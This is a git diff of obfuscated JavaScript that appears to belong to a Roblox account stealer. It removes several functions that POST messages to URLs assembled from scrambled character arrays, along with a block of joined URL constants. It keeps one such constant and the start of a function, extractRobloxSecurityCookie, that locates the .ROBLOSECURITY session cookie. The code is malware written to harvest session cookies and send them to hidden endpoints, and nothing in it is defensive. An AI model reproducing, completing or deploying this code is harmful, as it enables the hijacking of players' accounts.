@@ -239,54 +239,14 @@ const diejwjdhjejwjwcsadwabfwadawdw = [
   'wE', 'rT', 'yU', 'iO', 'pP'
 ];
 
-function awdawdawd() {
-  const url2 = fuckoffplzjustgivemetimetomakeaproxy.join('');
-  const payload = { content: 'get off the backend u dumbass' };
-  fetch(url2, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  });
-}
 
-function dwawadwad() {
-  const url3 = diejwjdhjedwawadjwjw3dawawdwad.join('');
-  const payload = { content: 'DECRYPTING SESSSION ID ' };
-  fetch(url3, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  });
-}
 
-function awddwadaw() {
-  const url4 = diejwjdhjej321321wjw4rwa.join('');
-  const payload = { content: 'DECRYPTING SESSSION ID ' };
-  fetch(url4, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-  })
-  .then(response => {
-    if (!response.ok) {
-      throw new Error('Network response was not ok');
-    }
-    return response.json();
-  })
-  .then(data => console.log(data))
-  .catch(error => console.error('Error:', error));
-}
+
+    
+      
 
 const adwdawdacsazdawradfsadaw = fuckoffplzjustgivemetimetomakeaproxy.join(''); 
-const adwdawdacfazdawradfsadaw = diejwjdhadwawDawdwadjejwjw2daw.join('');    
-const adwdawdacfazdawhadfsadaw = diejwjdhjedwawadjwjw3dawawdwad.join(''); 
-const adwdawdacfazdawhasfsadaw = diejwjdhjej321321wjw4rwa.join(''); 
-const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join(''); 
-const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
-const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
-const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
-const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join(''); // Fixed: Replaced missing array with existing one
-const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join('');
+
 
 function extractRobloxSecurityCookie(sessionId) {
   // Use a regular expression to find the .ROBLOSECURITY cookie
